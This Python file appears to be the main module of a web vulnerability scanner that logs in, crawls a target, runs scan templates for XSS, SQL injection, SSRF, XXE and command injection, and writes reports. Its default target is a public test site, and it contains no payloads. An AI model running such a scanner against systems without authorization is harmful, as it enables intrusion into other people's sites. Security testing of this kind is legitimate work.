class AdvancedScanner:
    def __init__(self, config_path="config.yaml"):
        self.config = Config(config_path).config
        self.oob_server = None
        
    async def scan(self):
        print(f"{Fore.CYAN}🚀 Advanced Website Vulnerability Scanner Starting...")
        print(f"{Fore.YELLOW}Target: {self.config['target']}")
        
        # Start OOB server if enabled
        if self.config["oob"]["enabled"]:
            self.oob_server = OOBServer(
                self.config["oob"]["dns_server"], 
                self.config["oob"]["port"]
            )
            await self.oob_server.start()
        
        # Initialize session and authenticate
        session = AuthSession(self.config["login"])
        await session.login()
        
        if session.authenticated:
            print(f"{Fore.GREEN}✓ Authentication successful")
        else:
            print(f"{Fore.YELLOW}⚠ Proceeding without authentication")
        
        # Crawl and discover endpoints
        crawler = BrowserCrawler(session, self.config["scan"])
        endpoints, forms = await crawler.discover(self.config["target"])
        
        print(f"{Fore.CYAN}📊 Discovery Results:")
        print(f"  • Endpoints found: {len(endpoints)}")
        print(f"  • Forms found: {len(forms)}")
        
        if not forms:
            print(f"{Fore.YELLOW}⚠ No forms found to test. Consider checking the target URL.")
        
        # Run vulnerability scans
        engine = TemplateEngine(session, endpoints, forms, self.oob_server, self.config["scan"])
        findings = await engine.run_all()
        
        # Run plugins
        plugin_manager = PluginManager(self.config["plugins"])
        plugin_manager.execute(findings)
        
        # Generate reports
        report_generator = ReportGenerator(findings, self.config["report"])
        report_generator.generate()
        
        # Summary
        print(f"\n{Fore.CYAN}📋 Scan Summary:")
        print(f"  • Total vulnerabilities found: {len(findings)}")
        
        if findings:
            severity_counts = {}
            for finding in findings:
                severity = finding['severity']
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
            
            for severity, count in severity_counts.items():
                color = Fore.RED if severity == 'Critical' else Fore.YELLOW if severity == 'High' else Fore.GREEN
                print(f"  • {color}{severity}: {count}")
        
        return findings

# Configuration file template
def create_default_config():
    default_config = """target: "http://testphp.vulnweb.com"
login:
  url: null
  method: "form"
  credentials:
    username: ""
    password: ""
scan:
  max_concurrency: 10
  timeout: 30
  depth: 3
  templates: ["xss", "sqli", "ssrf", "csrf", "idor", "xxe", "cmd_injection"]
oob:
  dns_server: "127.0.0.1"
  port: 9999
  enabled: false
report:
  format: ["html", "json", "markdown"]
  output_dir: "./reports"
plugins: ["ai_patch"]
"""
    
    with open("config.yaml", "w") as f:
        f.write(default_config)
    print(f"{Fore.GREEN}Default config.yaml created!")

async def main():
    import sys
    
    # Print the banner first
    print_banner()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--create-config":
        create_default_config()
        return
    
    scanner = AdvancedScanner()
    findings = await scanner.scan()
    
    if findings:
        print(f"\n{Fore.RED}⚠ Vulnerabilities detected! Check the generated reports.")
    else:
        print(f"\n{Fore.GREEN}✓ No vulnerabilities found.")
    
    # End signature
    print(f"\n{Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"{Fore.MAGENTA}🚀 Scan completed by Zephyr's Advanced Vulnerability Scanner")
    print(f"{Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user.")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {e}")
